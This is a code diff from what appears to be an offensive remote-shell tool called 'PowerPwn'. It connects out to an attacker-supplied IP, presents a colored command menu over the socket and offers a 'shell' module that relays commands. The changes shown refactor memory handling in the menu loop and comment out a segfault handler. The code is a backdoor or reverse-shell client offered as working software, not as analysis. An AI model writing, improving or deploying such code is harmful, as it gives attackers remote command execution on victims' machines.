@@ -48,7 +48,6 @@ void Formatting::seperator(void) {
 void Modules::help(void) {
     struct commands cmd;
     std::string cmds_list = "Commands\n";
-
     cmd.shell = "shell\n";
     cmd.exit = "exit\n";
     cmd.help = "help\n";
@@ -69,6 +68,7 @@ void Modules::shell(void) {
     std::string exits = "Type exit to return to PowerPwn.\n";
     char option[BUFFER];
     const char *errors = " 2>&0";
+
     write(Connection::sd(), exe.data(), exe.length());
     write(Connection::sd(), exits.data(), exits.length());
 
@@ -86,12 +86,7 @@ void Modules::shell(void) {
     }
 }
 
-int options(void) {
-    struct commands *cmd = NULL;
-    char *option = NULL;
-
-    option = (char*)malloc(BUFFER);
-    cmd = (commands*)malloc(sizeof(struct commands));
+int options(char *option, struct commands *cmd) {
     get_input(option);
 
     cmd->shell = "shell";
@@ -109,13 +104,22 @@ int options(void) {
 }
 
 void main_loop(void) {
+    struct commands *cmd = NULL;
     std::string powerpwn = "(PowerPwn) > ";
+    char *option = NULL;
+    option = (char*)malloc(BUFFER);
+    cmd = (commands*)malloc(sizeof(struct commands));
 
     do {
         Formatting::red();
         write(Connection::sd(), powerpwn.data(), powerpwn.length());
         Formatting::green();
-    } while (options() != 1);
+    } while (options(option, cmd) != 1);
+
+    free(option);
+    option = NULL;
+    free(cmd);
+    cmd = NULL;
 }
 
 void Connection::create_connection(char ip[CMDLINE_BUFFER]) {
@@ -132,15 +136,15 @@ void Connection::create_connection(char ip[CMDLINE_BUFFER]) {
 }
 
 int main(int argc, char **argv) {
-    struct sigaction sa;
+    //struct sigaction sa;
 
     if (argc < 1)
         return 1;
 
-    memset(&sa, '\0', sizeof(sa));
+    /*memset(&sa, '\0', sizeof(sa));
     sa.sa_sigaction = (void (*)(int, siginfo_t *, void *))&exit;
     sa.sa_flags = SA_SIGINFO;
-    sigaction(SIGSEGV, &sa, NULL);
+    sigaction(SIGSEGV, &sa, NULL);*/
     Connection::create_connection(argv[1]);
     main_loop();
 
